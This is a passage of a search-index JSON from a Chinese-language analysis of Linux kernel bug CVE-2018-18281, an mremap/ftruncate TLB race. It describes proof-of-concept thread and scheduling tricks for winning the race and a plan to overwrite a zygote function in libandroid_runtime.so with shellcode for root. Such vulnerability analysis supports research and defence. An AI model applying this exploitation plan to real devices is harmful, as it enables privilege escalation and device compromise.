\u8fd8\u662f ftruncate, \u5e95\u5c42\u5b9e\u73b0\u4f1a\u5c06 X \u548c Y \u6309\u7167 pmd \u4e3a\u5355\u4f4d\u5faa\u73af\u6267\u884c\u4e0a\u8868\u7684\u64cd\u4f5c, \n\u5373\u4e0a\u8868\u6240\u8bf4\u7684 X \u9875\u8868\u5b9e\u9645\u6307\u7684\u662f X \u5185\u5b58\u533a\u57df\u91cc\u7684\u67d0\u4e2a pmd, \u8fd9\u91cc\u662f\u4e3a\u4e86\u8868\u8fbe\u65b9\u4fbf\u7b80\u5316\u5904\u7406, \n\u4e0b\u9762\u7684\u63cf\u8ff0\u4e5f\u662f\u4e00\u6837.  \u8fd9\u91cc\u5b58\u5728\u7684\u7ade\u6001\u6761\u4ef6\u662f\u5f53 4.3 \u5df2\u7ecf\u6267\u884c\u5b8c\u6bd5 (3.1.3 \u91ca\u653e Y \u9501 4.1 \u5c31\u53ef\u4ee5\u6267\u884c), \u5730\u5740 Y \u7684\u5185\u5b58\u5df2\u7ecf\u91ca\u653e, \u7269\u7406\u9875\u9762\u5df2\u7ecf\u8fd4\u56de\u7ed9  \u4f19\u4f34\u7cfb\u7edf  , \u5e76\u518d\u4e00\u6b21\u5206\u914d\u7ed9\u65b0\u7684\u865a\u62df\u5185\u5b58, \u800c\u6b64\u65f6 3.2 \u8fd8\u6ca1\u6709\u6267\u884c, \u8fd9\u79cd\u60c5\u51b5\u4e0b, \u867d\u7136 X \u7684\u6620\u5c04\u5173\u7cfb\u5728\u9875\u8868\u91cc\u5df2\u7ecf\u88ab\u6e05\u7a7a, \u4f46\u5728 TLB \u7f13\u5b58\u91cc\u6ca1\u6709\u88ab\u6e05\u7a7a, \u7ebf\u7a0b C \u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee X \u7684\u5185\u5b58, \u9020\u6210\u5730\u5740\u590d\u7528  \u6ce8\u610f:\n\n\u9664\u4e86\u53ef\u4ee5\u7528 ftruncate \u51fd\u6570\u6765\u8ddf mremap \u7ade\u4e89, \u8fd8\u6709\u4e00\u4e2a linux \u7cfb\u7edf\u7279\u6709\u7684\n\u7cfb\u7edf\u51fd\u6570 fallocate \u4e5f\u53ef\u4ee5\u8d77\u5230\u540c\u6837\u7684\u6548\u679c, \u539f\u56e0\u5f88\u7b80\u5355, \nfallocate \u548c ftruncate \u7684\u5e95\u5c42\u8c03\u7528\u94fe\u662f\u4e00\u6837\u7684\n\nsys_fallocate()->shmem_fallocate()->shmem_truncate_range()\n->shmem_undo_range()->truncate_inode_page()->unmap_mapping_range   v4.9 \u4e4b\u524d\u7684\u5185\u6838\u90fd\u662f\u4e0a\u8ff0\u5217\u8868\u663e\u793a\u7684\u4ee3\u7801\u903b\u8f91  v4.9 \u4e4b\u540e\u7684\u5185\u6838, move_ptes \u7684\u903b\u8f91\u4e0e\u4e0a\u8ff0\u6709\u4e9b\u8bb8\u4e0d\u540c   \u6ce8\u610f:\n\n\u5728 versions > 4.9 \u7684 linux \u5185\u6838, Dirty \u6807\u8bb0\u7684\u9875\u9762\u4f1a\u5728 move_ptes \u51fd\u6570\u5185\u90e8\u5237\u65b0 TLB , \n\u800c\u4e0d\u662f\u7b49\u5230 3.2 \u7531 flush_tlb_range \u51fd\u6570\u53bb\u5237\u65b0, \u56e0\u6b64, race \u53d1\u751f\u4e4b\u540e, \n\u7ebf\u7a0b C \u80fd\u901a\u8fc7 X \u8bbf\u95ee\u5230\u7684\u5185\u5b58\u90fd\u662f\u4e4b\u524d non-Dirty \u7684\u9875\u9762, \u5373\u88ab\u5199\u8fc7\u7684\u9875\u9762\u90fd\u65e0\u6cd5\u590d\u7528. \n\n\u8fd9\u70b9\u6539\u53d8\u4f1a\u5bf9 poc \u548c exploit \u9020\u6210\u4ec0\u4e48\u5f71\u54cd? \u7559\u7ed9\u5927\u5bb6\u601d\u8003.",
            "title": "b.\u6f0f\u6d1e\u539f\u7406"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#c_1",
            "text": "\u903b\u8f91\u9519\u8bef",
            "title": "c.\u6f0f\u6d1e\u7c7b\u578b"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#d_1",
            "text": "",
            "title": "d.\u6f0f\u6d1e\u8865\u4e01"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#ecve",
            "text": "cve-2018-18281",
            "title": "e.\u6f0f\u6d1eCVE\u53f7"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#3poc",
            "text": "",
            "title": "3.POC"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#apoc",
            "text": "\u6839\u636e\u4e0a\u8ff0\u5206\u6790, \u4e00\u4e2a\u7b80\u5355\u7684 poc \u601d\u8def\u5c31\u51fa\u6765\u4e86, \u901a\u8fc7\u4e0d\u65ad\u68c0\u6d4b\u7ebf\u7a0b C \u4ece\u5730\u5740 X \u8bfb\u53d6\u7684\u5185\u5bb9\u662f\u4e0d\u662f\u521d\u59cb\u5185\u5bb9\u5c31\u53ef\u4ee5\u5224\u65ad race \u662f\u5426\u88ab\u89e6\u53d1, \u6b63\u5e38\u60c5\u51b5\u4e0b, C \u8bfb\u53d6 X \u53ea\u4f1a\u6709\u4e24\u79cd\u7ed3\u679c, \u4e00\u79cd\u662f mremap \u5f7b\u5e95\u5b8c\u6210, \u5373 3.2 \u6267\u884c\u5b8c\u6bd5, \u6b64\u65f6\u5730\u5740 X \u4e3a\u65e0\u6548\u5730\u5740, C \u7684\u8bfb\u64cd\u4f5c\u5f15\u53d1\u8fdb\u7a0b\u5954\u6e83\u9000\u51fa, \u7b2c\u4e8c\u79cd\u662f mremap \u8fd8\u672a\u5b8c\u6210, C \u8bfb\u53d6\u7684\u5730\u5740\u8fd4\u56de\u7684\u662f X \u7684\u521d\u59cb\u5185\u5bb9, \u53ea\u6709\u8fd9\u4e24\u79cd\u60c5\u51b5\u624d\u7b26\u5408 mremap \u51fd\u6570\u7684\u5b9a\u4e49. \u4f46\u662f\u7531\u4e8e\u6f0f\u6d1e\u7684\u5b58\u5728, \u5b9e\u9645\u8fd0\u884c\u4f1a\u5b58\u5728\u7b2c\u4e09\u79cd\u60c5\u51b5, \u5373 C \u8bfb\u53d6 X \u4e0d\u4f1a\u5954\u6e83(3.2 \u8fd8\u6ca1\u6267\u884c, \u5730\u5740\u6620\u5c04\u8fd8\u6709\u6548), \u4f46\u5185\u5bb9\u53d8\u4e86( 4.3 \u6267\u884c\u5b8c\u6bd5, \u7269\u7406\u9875\u9762\u5df2\u7ecf\u88ab\u5176\u4ed6\u5730\u65b9\u590d\u7528)  \u521d\u59cb\u7248 poc  \u53ef\u4ee5\u6e05\u6670\u770b\u51fa race \u662f\u600e\u4e48\u53d1\u751f\u7684, \u9700\u8981\u6ce8\u610f, \u8fd9\u4efd poc \u5fc5\u987b\u914d\u5408\u5185\u6838\u8865\u4e01\u624d\u80fd\u7a33\u5b9a\u89e6\u53d1 race , \u5426\u5219\u547d\u4e2d\u7387\u975e\u5e38\u4f4e, \u8865\u4e01\u901a\u8fc7\u5728 move_page_tables \u51fd\u6570\u8c03\u7528 flush_tlb_range \u4e4b\u524d(\u5373 3.2 \u4e4b\u524d)\u589e\u52a0\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u589e\u5927 race \u6761\u4ef6\u7684\u65f6\u95f4\u7a97\u53e3\u4ee5\u63d0\u9ad8\u547d\u4e2d\u7387  \u4e0a\u8ff0 poc \u7684\u8fd0\u884c\u7ed3\u679c\u662f, \u5927\u90e8\u5206\u60c5\u51b5\u4e0b poc \u5954\u6e83\u9000\u51fa, \u5c11\u6570\u60c5\u51b5\u4e0b\u8bfb\u53d6 X \u4f1a\u8fd4\u56de\u4e00\u4e2a\u8ddf\u521d\u59cb\u503c\u4e0d\u540c\u7684\u503c  \u8fd9\u79bb\u7a33\u5b9a\u63d0\u6743\u8fd8\u6709\u5f88\u8fdc\u7684\u8ddd\u79bb, \u4e3a\u4e86\u5f97\u5230\u7a33\u5b9a\u5229\u7528, \u81f3\u5c11\u6709\u4e24\u4e2a\u95ee\u9898\u9700\u8981\u89e3\u51b3:   \u5982\u4f55\u63d0\u9ad8 race \u7684\u547d\u4e2d\u7387  \u600e\u4e48\u5b9e\u73b0\u63d0\u6743",
            "title": "a.POC\u539f\u7406"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#race",
            "text": "\u8981\u63d0\u9ad8\u672c\u6f0f\u6d1e race \u7684\u547d\u4e2d\u7387, \u5c31\u662f\u8981\u589e\u5927 move_ptes \u51fd\u6570\u548c flush_tlb_range \u51fd\u6570\u4e4b\u95f4\u7684\u65f6\u95f4\u95f4\u9694  \u600e\u4e48\u624d\u80fd\u589e\u52a0\u8fd9\u4fe9\u51fd\u6570\u6267\u884c\u7684\u65f6\u95f4\u95f4\u9694\u5462?  \u8fd9\u91cc\u8981\u5f15\u5165linux\u5185\u6838\u7684  \u8fdb\u7a0b\u62a2\u5360  \u6982\u5ff5, \u5982\u679c\u76ee\u6807\u5185\u6838\u662f\u53ef\u62a2\u5360\u7684 (CONFIG_PREEMPT=y) , \u5219\u5982\u679c\u80fd\u8ba9\u8fdb\u7a0b\u5728\u6267\u884c flush_tlb_range \u51fd\u6570\u4e4b\u524d\u88ab\u62a2\u5360, \u90a3\u4e48 race \u7684\u65f6\u95f4\u7a97\u53e3\u5c31\u591f\u5927\u4e86, \u7528\u6237\u7a7a\u95f4\u7684\u666e\u901a\u7a0b\u5e8f\u80fd\u4e0d\u80fd\u5f71\u54cd\u67d0\u4e2a\u8fdb\u7a0b\u7684\u8c03\u5ea6\u7b56\u7565\u5462? \u7b54\u6848\u662f\u80af\u5b9a\u7684.  \u6709\u4e24\u4e2a\u7cfb\u7edf\u51fd\u6570\u53ef\u4ee5\u5f71\u54cd\u8fdb\u7a0b\u7684\u8c03\u5ea6   sched_setaffinity  \u51fd\u6570\u7528\u6765\u7ed1\u5b9a\u8fdb\u7a0b\u5230\u67d0\u4e2a cpu core  sched_setscheduler  \u51fd\u6570\u7528\u6765\u8bbe\u7f6e\u8fdb\u7a0b\u7684\u8c03\u5ea6\u7b56\u7565\u548c\u8c03\u5ea6\u53c2\u6570   \u4f7f\u7528\u8fd9\u4e24\u4e2a\u51fd\u6570\u5c06 poc \u4fee\u6539\u4e3a\u4e0b\u9762\u7684\u65b9\u6848,  \u65b0\u5efa A,B,C,D \u56db\u4e2a\u7ebf\u7a0b:   1) A \u6620\u5c04\u4e00\u4e2a\u6587\u4ef6 a \u5230\u5730\u5740 X, A \u7ed1\u5b9a\u5230\u6838 c1, A \u8c03\u5ea6\u7b56\u7565\u8bbe\u7f6e\u4e3a SCHED_IDLE   2) C \u7ed1\u5b9a\u5230\u6838 c1, C \u963b\u585e\u5728\u67d0\u4e2a pipe, pipe \u8fd4\u56de\u5219\u8c03\u7528 ftruncate \u5c06\u6587\u4ef6 a \u7684\u6587\u4ef6\u5927\u5c0f\u6539\u4e3a 0  3) A \u8c03\u7528 mremap \u91cd\u65b0\u6620\u5c04 X \u5230 Y, \u8fd9\u5c06\u6267\u884c\u4e0b\u9762\u4e24\u4e2a\u51fd\u6570:  3.1) move_ptes  3.2) flush_tlb_range    4) D \u7ed1\u5b9a\u5230\u6838 c2, \u76d1\u63a7\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u5c04\u60c5\u51b5,\u5982\u679c\u53d1\u751f\u53d8\u5316\u5219\u901a\u8fc7\u5199 pipe \u5524\u9192 C  5) B \u7ed1\u5b9a\u5230\u6838 c3, \u5faa\u73af\u8bfb\u53d6 X \u7684\u5185\u5bb9, \u5e76\u5224\u65ad\u662f\u5426\u8fd8\u662f\u521d\u59cb\u503c   \u6ce8\u610f:\n\nmremap \u6267\u884c move_ptes \u51fd\u6570\u4f1a\u5f15\u53d1\u5185\u5b58\u72b6\u6001\u53d8\u5316, \u8fd9\u79cd\u53d8\u5316\u53ef\u4ee5\u901a\u8fc7\n\u7528\u6237\u6001\u6587\u4ef6 /proc/pid/status \u6587\u4ef6\u83b7\u53d6, \u8fd9\u5c31\u662f\u7ebf\u7a0b D \u7684\u4f5c\u7528  \u6b64\u65f6, \u901a\u8fc7\u76d1\u63a7\u7ebf\u7a0b D \u5524\u9192 C, \u7531\u4e8eA \u548c C \u7ed1\u5b9a\u5728\u540c\u4e00\u4e2a\u6838\u5fc3 c1, \u4e14 A \u7684\u8c03\u5ea6\u7b56\u7565\u88ab\u8bbe\u7f6e\n\u4e3a\u6700\u4f4e\u4f18\u5148\u7ea7 SCHED_IDLE, C \u7684\u5524\u9192\u5c06\u62a2\u5360 A \u7684\u6267\u884c, \u5982\u6b64\u4e00\u6765, 3.2 \u7684\u6267\u884c\u5c31\u53ef\u80fd\u88ab\u5ef6\u8fdf. \nC \u88ab\u5524\u9192\u540e\u7acb\u5373\u6267\u884c ftruncate \u91ca\u653e Y \u7684\u5185\u5b58\u89e6\u53d1\u6f0f\u6d1e.  \u901a\u8fc7\u4e0a\u8ff0\u65b9\u6848\u53ef\u4ee5\u7406\u8bba\u4e0a\u8ba9\u7ebf\u7a0b A \u5728\u6267\u884c 3.1 \u540e, \u6267\u884c 3.2 \u524d\u88ab\u6302\u8d77, \n\u4ece\u800c\u6269\u5927 3.1 \u548c 3.2 \u7684\u65f6\u95f4\u95f4\u9694   \u6539\u8fdb\u7248 poc  \u662f\u6839\u636e\u4e0a\u8ff0\u601d\u8def\u5199\u7684",
            "title": "\u5982\u4f55\u63d0\u9ad8 race \u7684\u547d\u4e2d\u7387"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#poc",
            "text": "\u5b9e\u6d4b\u53d1\u73b0\u4e0a\u8ff0 poc \u89e6\u53d1\u7387\u8fd8\u662f\u4f4e, \u501f\u9274 Jann Horn \u7684\u601d\u8def, \u7ee7\u7eed\u5982\u4e0b\u4fee\u6539 poc   \u6539\u8fdb\u7248\u65b9\u6848: \u65b0\u5efa A,B,C,D,E \u4e94\u4e2a\u7ebf\u7a0b:   1) A \u6620\u5c04\u4e00\u4e2a\u6587\u4ef6 a \u5230\u5730\u5740 X, A \u7ed1\u5b9a\u5230\u6838 c1, A \u8c03\u5ea6\u7b56\u7565\u8bbe\u7f6e\u4e3a SCHED_IDLE   2) C \u7ed1\u5b9a\u5230\u6838 c1, C \u963b\u585e\u5728\u67d0\u4e2a pipe, pipe \u8fd4\u56de\u5219\u7acb\u5373\u5c06 A \u91cd\u65b0\u7ed1\u5b9a\u5230\u6838 c4, \u5e76\u8c03\u7528 ftruncate \u5c06\u6587\u4ef6 a \u7684\u6587\u4ef6\u5927\u5c0f\u6539\u4e3a 0  3) A \u8c03\u7528 mremap \u91cd\u65b0\u6620\u5c04 X \u5230 Y  3.1) move_ptes  3.2) flush_tlb_range    4) D \u7ed1\u5b9a\u5230\u6838 c2, \u76d1\u63a7\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u5c04\u60c5\u51b5,\u5982\u679c\u53d1\u751f\u53d8\u5316\u5219\u901a\u8fc7\u5199 pipe \u5524\u9192 C  5) B \u7ed1\u5b9a\u5230\u6838 c3, \u5faa\u73af\u8bfb\u53d6 X \u7684\u5185\u5bb9, \u5e76\u5224\u65ad\u662f\u5426\u8fd8\u662f\u521d\u59cb\u503c  6) E \u7ed1\u5b9a\u5230\u6838 c4, \u6267\u884c\u4e00\u4e2a\u6b7b\u5faa\u73af.   \u6539\u8fdb\u7684\u5730\u65b9\u6709\u4e24\u70b9, 1 \u662f\u589e\u52a0\u4e00\u4e2a E \u7ebf\u7a0b\u7ed1\u5b9a\u5230\u6838 c4 \u5e76\u6267\u884c\u6b7b\u5faa\u73af, 2 \u662f\u7ebf\u7a0b C \u88ab\u5524\u9192\u540e\u7acb\u523b\u91cd\u7ed1\u5b9a\u7ebf\u7a0b A \u5230\u6838 c4, \u5373\u8ba9 A \u548c E \u5728\u540c\u4e00\u4e2a\u6838\u4e0a  \u8fd9\u4e2a\u6539\u53d8\u4f1a\u63d0\u9ad8 race \u89e6\u53d1\u7684\u547d\u4e2d\u7387, \u4e2a\u4eba\u5224\u65ad\u539f\u56e0\u662f\u7531\u4e8e\u5f53 C \u7684\u7ba1\u9053\u8fd4\u56de\u540e\u624b\u52a8\u6267\u884c\u91cd\u7ed1\u5b9a\u64cd\u4f5c\u4f1a\u6bd4\u6267\u884c\u5176\u4ed6\u64cd\u4f5c\u66f4\u5bb9\u6613\u5bfc\u81f4 A \u7acb\u5373\u88ab\u6302\u8d77   \u6700\u7ec8\u7248 poc  \u662f\u6839\u636e\u4e0a\u8ff0\u601d\u8def\u5199\u7684  \u5229\u7528\u8fd9\u4e2a poc, \u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u6f0f\u6d1e\u7684 race \u547d\u4e2d\u7387\u63d0\u5347\u5230\u53ef\u4ee5\u63a5\u53d7\u7684\u7a0b\u5ea6.",
            "title": "\u6539\u8fdb\u7248\u7684 poc"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#bpoc",
            "text": "\u521d\u59cb\u7248 poc  \u6539\u8fdb\u7248 poc  \u6700\u7ec8\u7248 poc",
            "title": "b.POC\u6e90\u7801"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#c_2",
            "text": "",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#4exp",
            "text": "",
            "title": "4.EXP"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#aexp",
            "text": "",
            "title": "a.EXP\u539f\u7406"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#_1",
            "text": "\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5728\u6bd4\u8f83\u77ed\u7684\u65f6\u95f4\u5185\u7a33\u5b9a\u89e6\u53d1\u6f0f\u6d1e, \u5f97\u5230\u4e00\u7247\u5df2\u7ecf\u88ab\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u7684\u4f7f\u7528\u6743, \n\u800c\u4e14\u53ef\u8bfb\u53ef\u5199, \u600e\u4e48\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u63d0\u6743?  \u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7269\u7406\u5185\u5b58\u7684\u5206\u914d\u548c\u91ca\u653e\u7ec6\u8282, \u7269\u7406\u5185\u5b58\u7ba1\u7406\u5c5e\u4e8e \u4f19\u4f34\u7cfb\u7edf , \u53c2\u8003  \u5185\u5b58\u7ba1\u7406  \u7269\u7406\u9875\u9762\u7684\u7ba1\u7406\u662f\u5206\u5c42\u7684:   node: NUMA \u4f53\u7cfb\u67b6\u6784\u6709 node \u7684\u6982\u5ff5, \u4e0d\u540c node \u7684\u7269\u7406\u5185\u5b58\u662f\u5206\u5f00\u7ba1\u7406\u7684  zone: \u6839\u636e\u7269\u7406\u5185\u5b58\u7684\u533a\u57df\u5206\u82e5\u5e72\u79cd zone, \u4e0d\u540c\u573a\u666f\u4f1a\u4f18\u5148\u5411\u4e0d\u540c\u7684 zone \u5206\u914d , \u6bd4\u5982\u7528\u6237\u7a7a\u95f4\u7533\u8bf7\u5185\u5b58, \u4f1a\u4f18\u5148\u4ece ZONE_NORMAL \u8fd9\u4e2a zone \u5206\u914d, \u5982\u679c\u4e0d\u591f\u518d\u4ece\u5176\u4ed6 zone \u5206\u914d  ZONE_DMA  ZONE_NORMAL  ZONE_HIGHMEM  \u5176\u4ed6    migration-type: \u5185\u6838\u6839\u636e\u53ef\u8fc1\u79fb\u6027\u5bf9\u9875\u9762\u8fdb\u884c\u5206\u7ec4\u7ba1\u7406, \u7528\u4e8e anti-fragmentation, \u53ef\u4ee5\u53c2\u8003  \u5185\u6838\u9875\u9762\u8fc1\u79fb\u4e0e\u53cd\u788e\u7247\u673a\u5236    MIGRATE_UNMOVABLE  MIGRATE_RECLAIMABLE  MIGRATE_MOVABLE     __alloc_pages_nodemask \u51fd\u6570\u662f zoned buddy allocator \u7684\u5206\u914d\u5165\u53e3, \u5b83\u6709\u5feb\u6162\u4e24\u6761\u8def\u5f84:   get_page_from_freelist , \u5feb\u8def\u5f84  1) if order == 0, \u4ece per-cpu \u7684\u6307\u5b9a zone \u6307\u5b9a migratetype \u7684 cache list \u91cc\u83b7\u53d6 page  pcp = &this_cpu_ptr(zone->pageset)->pcp  list = &pcp->lists[migratetype]  page = list_entry(list->next, struct page, lru);    2) __rmqueue_smallest : \u5728\u6307\u5b9a\u8fc1\u79fb\u7c7b\u578b\u4e0b\u81ea\u5e95\u5411\u4e0a\u8fdb\u884c\u5404\u9636\u904d\u5386\u67e5\u627e\u6240\u9700\u7684\u7a7a\u95f2\u9875\u9762  area = &zone->free_area[current_order]  list = &area->free_list[migratetype]  page = list_entry(list->next, struct page, lru);    3) __rmqueue_cma,  \u8fde\u7eed\u5185\u5b58\u5206\u914d\u5668  \u7528\u4e8eDMA\u6620\u5c04\u6846\u67b6\u4e0b\u63d0\u5347\u8fde\u7eed\u5927\u5757\u5185\u5b58\u7684\u7533\u8bf7  4) __rmqueue_fallback, \u5982\u679c\u5728\u6307\u5b9a\u8fc1\u79fb\u7c7b\u578b\u4e0b\u5206\u914d\u5931\u8d25\uff0c\u4e14\u7c7b\u578b\u4e0d\u4e3aMIGRATE_RESERVE\u65f6, \u5c31\u5728 fallbacks \u6570\u7ec4\u91cc\u627e\u5230\u4e0b\u4e00\u4e2a migratetype, \u7531\u6b64\u83b7\u5f97\u7684\u9636\u53f7\u548c\u8fc1\u79fb\u7c7b\u578b\u67e5\u627ezone->free_area[]->free_list[]\u7a7a\u95f2\u9875\u9762\u7ba1\u7406\u94fe\u8868    __alloc_pages_slowpath, \u6162\u8def\u5f84  \u7565     \u4ece\u6f0f\u6d1e\u5229\u7528\u7684\u89d2\u5ea6, \u6211\u4eec\u5e0c\u671b\u5c06\u6f0f\u6d1e\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u5c3d\u53ef\u80fd\u5feb\u7684\u88ab\u91cd\u65b0\u5206\u914d\u56de\u6765, \u6240\u4ee5, \u7528\u6765\u89e6\u53d1\u6f0f\u6d1e\u91ca\u653e\u7269\u7406\u9875\u9762\u7684\u573a\u666f\u548c\u91cd\u65b0\u7533\u8bf7\u7269\u7406\u9875\u9762\u7528\u6765\u5229\u7528\u7684\u573a\u666f, \u8fd9\u4e24\u79cd\u573a\u666f\u7684 zone, migratetype \u6700\u597d\u4e00\u81f4, \u800c\u4e14\u8fd9\u4e24\u4e2a\u573a\u666f\u7684\u89e6\u53d1\u6700\u597d\u5728\u540c\u4e00\u4e2a cpu core \u4e0a.  \u6bd4\u5982, \u89e6\u53d1\u6f0f\u6d1e\u65f6, \u901a\u8fc7\u7528\u6237\u7a7a\u95f4 mmap \u4e00\u7247\u5730\u5740, \u7136\u540e\u8bbf\u95ee\u8fd9\u7247\u5730\u5740\u89e6\u53d1\u7269\u7406\u5185\u5b58\u5206\u914d, \u8fd9\u79cd\u5206\u914d\u5927\u6982\u7387\u662f\u4ece ZONE_NORMAL \u800c\u6765, \u800c\u4e14\u9875\u9762\u5927\u6982\u7387\u662f MIGRATE_MOVABLE \u7684, \u7136\u540e\u7528 ftruncate \u91ca\u653e, \u8fd9\u4e9b\u9875\u9762\u5f88\u53ef\u80fd\u4f1a\u6302\u5728\u5f53\u524d cpu \u7684 freelist \u4e0a.  \u6240\u4ee5, \u6f0f\u6d1e\u5229\u7528\u7684\u65f6\u5019\u5982\u679c\u662f\u5728\u5176\u4ed6 cpu core \u89e6\u53d1\u7533\u8bf7\u7269\u7406\u9875\u9762, \u5219\u53ef\u80fd\u7533\u8bf7\u4e0d\u5230\u76ee\u6807\u9875\u9762, \u6216\u8005, \u89e6\u53d1\u7533\u8bf7\u7269\u7406\u9875\u9762\u7684\u573a\u666f\u5982\u679c\u662f\u67d0\u79cd dma \u8bbe\u5907, \u90a3\u4e48\u4e5f\u5927\u6982\u7387\u547d\u4e2d\u4e0d\u5230\u76ee\u6807\u9875\u9762.",
            "title": "\u7269\u7406\u9875\u9762\u7ba1\u7406"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#_2",
            "text": "\u6839\u636e\u4e0a\u8ff0\u7269\u7406\u5185\u5b58\u7ba1\u7406\u7684\u5206\u6790, \u9009\u62e9\u4f7f\u7528\u6587\u4ef6\u7684 page cache \u7528\u4e8e\u91cd\u65b0\u7533\u8bf7\u76ee\u6807\u7269\u7406\u9875\u9762, \u5728\u6b64\u57fa\u7840\u4e0a, \u60f3\u529e\u6cd5\u5b9e\u73b0\u63d0\u6743  linux \u4e0a\u786c\u76d8\u6587\u4ef6\u7684\u5185\u5bb9\u5728\u5185\u6838\u7528 page cache \u6765\u7ef4\u62a4, \u5982\u679c\u6f0f\u6d1e\u89e6\u53d1\u540e\u91ca\u653e\u7684\u9875\u9762\u88ab\u7528\u4e8e\u67d0\u4e2a\u6587\u4ef6\u7684 page cache, \u5219\u6211\u4eec\u62e5\u6709\u4e86\u8bfb\u5199\u8be5\u6587\u4ef6\u7684\u80fd\u529b, \u5982\u679c\u8fd9\u4e2a\u6587\u4ef6\u6070\u597d\u662f\u7528\u6237\u6001\u7684\u91cd\u8981\u52a8\u6001\u5e93\u6587\u4ef6, \u6b63\u5e38\u60c5\u51b5\u4e0b\u666e\u901a\u8fdb\u7a0b\u65e0\u6cd5\u6539\u5199\u8fd9\u79cd\u6587\u4ef6, \u4f46\u901a\u8fc7\u6f0f\u6d1e\u666e\u901a\u8fdb\u7a0b\u53ef\u4ee5\u6539\u5199\u5b83, \u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u52a8\u6001\u5e93\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5\u6765\u63d0\u6743.  \u4e0a\u8ff0\u5229\u7528\u601d\u8def\u7684\u5173\u952e\u67093\u70b9:   \u9009\u62e9\u76ee\u6807\u52a8\u6001\u5e93\u6587\u4ef6  \u9009\u62e9\u76ee\u6807\u6587\u4ef6\u8981\u6539\u5199\u7684\u4f4d\u7f6e  \u63d0\u9ad8\u76ee\u6807\u4f4d\u7f6e\u6240\u5728\u9875\u9762\u7684\u547d\u4e2d\u7387   \u8fd9\u4e2a\u52a8\u6001\u5e93\u5fc5\u987b\u662f\u80fd\u88ab\u9ad8\u6743\u9650\u8fdb\u7a0b\u6240\u4f7f\u7528\n\u76ee\u6807\u4f4d\u7f6e\u6700\u597d\u662f\u9875\u9762\u5bf9\u9f50\u7684, \u8fd9\u6837\u76ee\u6807\u4f4d\u7f6e\u53ef\u4ee5\u4ee5\u9875\u9762\u4e3a\u5355\u4f4d\u52a0\u8f7d\u8fdb\u5185\u5b58, \u6216\u8005\u4ee5\u9875\u9762\u4e3a\u5355\u4f4d\u7f6e\u6362\u5230\u786c\u76d8\n\u76ee\u6807\u4f4d\u7f6e\u88ab\u8c03\u7528\u7684\u65f6\u673a\u4e0d\u80fd\u592a\u9891\u7e41, \u8981\u4e0d\u7136\u4fee\u6539\u64cd\u4f5c\u4f1a\u5f71\u54cd\u7cfb\u7edf\u7a33\u5b9a\u6027, \u800c\u4e14\u8c03\u7528\u65f6\u673a\u5fc5\u987b\u53ef\u4ee5\u7531\u666e\u901a\u8fdb\u7a0b\u89e6\u53d1  \u4e0b\u9762\u662f\u4e00\u4e2a\u7b26\u5408\u4e0a\u8ff0\u6761\u4ef6\u7684\u52a8\u6001\u5e93\u548c\u51fd\u6570:   libandroid_runtime.so \u52a8\u6001\u5e93  com_android_internal_os_Zygote_nativeForkAndSpecialize \u51fd\u6570  \u8fd9\u4e2a\u51fd\u6570\u88ab zygote \u8c03\u7528, zygote \u8fdb\u7a0b\u662f\u4e00\u4e2a\u7279\u6743\u8fdb\u7a0b  \u8fd9\u4e2a\u51fd\u6570\u5728 libandroid_runtime.so (pixel2 PQ1A.181105.017.A1) \u6587\u4ef6\u7684\u504f\u79fb\u662f 0x157000, \u8fd9\u4e2a\u504f\u79fb\u662f\u9875\u9762\u5bf9\u9f50\u7684  \u8fd9\u4e2a\u51fd\u6570\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u4f1a\u88ab\u8c03\u7528, \u53ea\u6709\u542f\u52a8\u65b0\u7684 app \u65f6\u4f1a\u88ab zygote \u8c03\u7528, \u53ef\u4ee5\u7531\u666e\u901a app \u89e6\u53d1 zygote \u53bb\u6267\u884c",
            "title": "\u600e\u4e48\u5b9e\u73b0\u63d0\u6743"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#_3",
            "text": "\u6f0f\u6d1e\u89e6\u53d1 race \u540e, \u8ba9\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u521a\u597d\u88ab\u7528\u4e8e\u76ee\u6807\u9875\u9762( libandroid_runtime.so \u6587\u4ef6\u7684 offset = 0x157000 \u8fd9\u4e2a\u9875\u9762), \u518d\u53ef\u4ee5\u901a\u8fc7 UAF \u5730\u5740\u6ce8\u5165 shellcode \u5230\u76ee\u6807\u4f4d\u7f6e, \u4ece\u800c\u6539\u5199 com_android_internal_os_Zygote_nativeForkAndSpecialize \u51fd\u6570\u7684\u4ee3\u7801\u903b\u8f91, \u6700\u540e\u53d1\u6d88\u606f\u89e6\u53d1 zygote \u53bb\u6267\u884c shellcode  \u8fd9\u8282\u89e3\u51b3\u7684\u95ee\u9898\u662f, \u600e\u4e48\u63a7\u5236 race \u91ca\u653e\u7684\u9875\u9762\u521a\u597d\u80fd\u88ab\u76ee\u6807\u9875\u9762\u4f7f\u7528  \u8fd9\u7bc7\u8bba\u6587  \u7684 section VIII-B 